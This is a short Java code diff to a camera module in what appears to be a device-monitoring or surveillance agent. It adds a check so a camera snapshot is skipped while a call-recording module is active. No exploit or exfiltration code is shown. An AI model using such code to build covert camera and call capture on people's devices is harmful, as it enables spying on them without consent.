@@ -60,7 +60,15 @@ public class ModuleCamera extends BaseInstantModule {
 	@Override
 	public void actualStart() {
 		try {
+			if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart), call recording, cannot get snapshot");
+				}
+				return;
+			}
+
 			snapshot();
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart) Error: " + e);
